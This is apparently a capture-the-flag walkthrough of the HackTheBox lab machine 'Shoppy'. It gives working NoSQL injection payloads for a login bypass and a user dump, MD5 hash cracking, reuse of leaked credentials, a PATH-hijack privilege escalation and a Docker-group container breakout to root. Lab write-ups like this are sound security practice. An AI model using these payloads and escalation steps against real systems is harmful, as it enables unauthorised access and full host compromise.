Initial nmap scans gve us a few ports and an http server on 80 that needs to be setup in hosts to access. http://shoppy.htb

Running `feroxbuster` we find a `/login` on port 80

Check for subdomains `wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://shoppy.htb' -H "Host: FUZZ.shoppy.htb" --hc 301`

we find `mattermost` add it to the /etc/hosts

We can bypass the login screen using nosql injection

- `user=' || 1==1%00&pass=' || 1==1%00`

Then searching for users we can use the following to dump all users

- `http://shoppy.htb/admin/search-users?username=admin'||'1==1`

```

_id	"62db0e93d6d6a999a66ee67a"
username	"admin"
password	"23c6877d9e2b564ef8b32c3a23de27b2"

_id	"62db0e93d6d6a999a66ee67b"
username	"josh"
password	"6ebcea65320589ca4f2f1ce039975995"
```

- `hashcat -m 0 shoppy.htb.hashes.josh /usr/share/wordlists/rockyou.txt`

and we get joshs pass: 6ebcea65320589ca4f2f1ce039975995:remembermethisway

We can login the the mattermost subdomain with their credentials.

Checking the recent mentions we have a note from jaeger

```
or the deploy machine, you can create an account with these creds :
username: jaeger
password: Sh0ppyBest@pp!
And deploy on it. 
```

also

Oh I forgot to tell you, that we're going to use docker for the deployment, so I will add it to the first deploy 
```

We can login via ssh with jaeger creds. and get user.txt flag

Checking sudo -l we can run the following command `sudo -u deploy /home/deploy/password-manager` which 

basically looks for creds then when proper creds inserted executes `cat /home/deploy/creds.txt`. now this isnt using the full path so we should be ablt to use PATH escalation. Create a cat file in /tmp with bash -i then add /tmp to PATH. export PATH=/tmp:$PATH then using ghidra we find the password for the manager is Sample. Running the file we get deploy creds.


```
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

checkng id and as expected we are inside a docker container and since we now have a user that belongs to the docker group we can escape. https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation

- `find / -name docker.sock 2>/dev/null`
- `docker run -it -v /:/host/ alpine chroot /host/ bash`

and we're root
